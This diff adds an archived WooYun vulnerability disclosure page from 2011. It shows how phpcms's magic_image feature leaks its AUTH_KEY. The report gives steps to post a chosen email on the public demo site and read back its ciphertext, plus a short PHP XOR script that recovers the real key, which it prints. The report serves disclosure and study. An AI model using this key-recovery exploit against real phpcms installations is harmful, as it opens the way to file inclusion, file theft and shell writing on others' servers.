@@ -1,0 +1,342 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		phpcms的另一个phpcms_auth函数的加密密钥AUTH_KEY泄漏漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		phpcms的另一个phpcms_auth函数的加密密钥AUTH_KEY泄漏漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/c4rp3nt3r">c4rp3nt3r</a> 
+</li><li>提交时间：		2011-04-05 19:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-04-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-04-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-04-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-04-26：	细节向普通白帽子公开<br/>
+									2011-05-06：	细节向实习白帽子公开<br/>
+									2011-05-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">phpcms的另一个phpcms_auth函数的加密密钥AUTH_KEY泄漏漏洞<br />
+<br />
+by c4rp3nt3r@0x50sec.org<br />
+phpcms又一个鸡肋，有木有～～～我只是证明漏洞的存在<br />
+phpcms的phpcms_auth函数的加密密钥AUTH_KEY泄漏会导致本地包含任意文件下载等多个漏洞。<br />
+而对phpcms2008有的本地包含又可以导致直接写shell和删除文件。所以泄漏了phpcms的phpcms_auth函数的加密密钥AUTH_KEY就可能直接导致被秒杀。<br />
+<br />
+《phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞》http://www.wooyun.org/bugs/wooyun-2010-01795<br />
+已经说明了两个破解&quot;phpcms_auth函数的加密密钥AUTH_KEY&quot;的方法，但是还不是很理想，最理想的是直接给我们足够的明文和密文。<br />
+是的开放的phpcms真的给我们这样的了，没有保留。<br />
+<br />
+上一篇说到&quot;破解了这个函数之后，一方面反而更加不安全了，另一方面所有建立在这个函数之上的机制可能都会受到攻击。&quot;<br />
+其实一切建立在这个函数上的代码都可能给我们机会破解这个密钥。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">phpcms的另一个phpcms_auth函数的加密密钥AUTH_KEY泄漏漏洞<br />
+<br />
+<br />
+<br />
+phpcms的phpcms_auth函数的加密密钥AUTH_KEY泄漏会导致本地包含任意文件下载等多个漏洞。<br />
+<br />
+而对phpcms2008有的本地包含又可以导致直接写shell和删除文件。所以泄漏了phpcms的phpcms_auth函数的加密密钥AUTH_KEY就可能直接导致被秒杀。<br />
+<br />
+<br />
+<br />
+《phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞》 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-01795">WooYun: phpcms的phpcms_auth导致的本地文件包含漏洞和任意文件下载漏洞</a> <br />
+<br />
+已经说明了两个破解&quot;phpcms_auth函数的加密密钥AUTH_KEY&quot;的方法，但是还不是很理想，最理想的是直接给我们足够的明文和密文。<br />
+<br />
+是的开放的phpcms真的给我们这样的了，没有保留。<br />
+<br />
+<br />
+<br />
+上一篇说到&quot;破解了这个函数之后，一方面反而更加不安全了，另一方面所有建立在这个函数之上的机制可能都会受到攻击。&quot;<br />
+<br />
+其实一切建立在这个函数上的代码都可能给我们机会破解这个密钥。<br />
+<br />
+来看magic_image函数，主要作用就是将字符串生成一个图片，这样做应该是为了防止别人采集网站上的数据，或者是防止泄漏隐私。<br />
+<br />
+<br />
+<br />
+</p><pre><code>// include global.fun.php<br />
+<br />
+function magic_image($txt, $fonttype = 4)<br />
+{<br />
+	if(empty($txt)) return false;<br />
+	if(function_exists(&quot;imagepng&quot;))<br />
+	{<br />
+		$txt = urlencode(phpcms_auth($txt, &#039;ENCODE&#039;, AUTH_KEY));<br />
+		$txt = &#039;&lt;img src=&quot;&#039;.PHPCMS_PATH.&#039;magic_image.php?gd=1&amp;fonttype=&#039;.$fonttype.&#039;&amp;txt=&#039;.$txt.&#039;&quot; align=&quot;absmiddle&quot;&gt;&#039;;<br />
+	}<br />
+	return $txt;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在招聘、供求信息、跳蚤市场等多个功能模块都用到了这个函数。而且像供求信息、跳蚤市场貌似普通注册用户就能发贴。<br />
+<br />
+发贴的时候在电话号码或邮箱那的字符就会被magic_image函数加密，显示给用户的时候又会调用magic_image.php文件，对字符串解密并进行生成图片。<br />
+<br />
+就是说：<br />
+<br />
+我们可以自定义明文<br />
+<br />
+并且我们也可以得到明文加密后的密文<br />
+<br />
+<br />
+<br />
+这就意味这我们可以得到全部密文(只要电话或邮箱的长度大于20位即可)，不费什么力气。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+--------------------<br />
+<br />
+举例说明<br />
+<br />
+1.在http://demo.phpcms.cn随便注册个普通用户会员<br />
+<br />
+2.在跳蚤市场那<br />
+<br />
+http://demo.phpcms.cn/info/sale/<br />
+<br />
+随便点开一个信息页点右侧的 【免费发布信息】 http://demo.phpcms.cn/contribute.php?catid=22<br />
+<br />
+随便发一条信息<br />
+<br />
+使用邮箱为<br />
+<br />
+mailc4rp3nt3r@gmail.com<br />
+<br />
+3.最后找到我们发布的信息:<br />
+<br />
+http://demo.phpcms.cn/2011/0405/366.html<br />
+<br />
+查看邮箱图片的地址<br />
+<br />
+http://demo.phpcms.cn/magic_image.php?gd=1&amp;fonttype=4&amp;txt=ADcCAw9wKjtaOhNGAS0uPQorC14OOQY%3D<br />
+<br />
+--------------------<br />
+<br />
+<br />
+<br />
+好了<br />
+<br />
+明文:mailc4rp3nt3r@gmail.com<br />
+<br />
+密文:ADcCAw9wKjtaOhNGAS0uPQorC14OOQY%3D<br />
+<br />
+<br />
+<br />
+解密一下:<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php<br />
+$key=&quot;mailc4rp3nt3r@gmail.com&quot;;<br />
+$txt=&#039;ADcCAw9wKjtaOhNGAS0uPQorC14OOQY%3D&#039;;<br />
+$txt=base64_decode(urldecode($txt));<br />
+<br />
+for($i=0;$i&lt;strlen($key);$i++)<br />
+{<br />
+		$code  .= $txt[$i] ^ $key[$i];<br />
+}<br />
+echo $code;<br />
+<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+运行结果:<br />
+<br />
+$ php /var/www/vul.php<br />
+<br />
+OXdcFVodxAcbCUeTgLBgOXdc<br />
+<br />
+<br />
+<br />
+我们的密钥就是：<br />
+<br />
+OXdcFVodxAcbCUeTgLBg<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://demo.phpcms.cn/ 此站密钥为 OXdcFVodxAcbCUeTgLBg </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">略 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/c4rp3nt3r" title="c4rp3nt3r">c4rp3nt3r</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-01824" title="phpcms的另一个phpcms_auth函数的加密密钥AUTH_KEY泄漏漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2011-04-06 10:07</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">谢谢c4rp3nt3r提交漏洞信息。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="1824";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
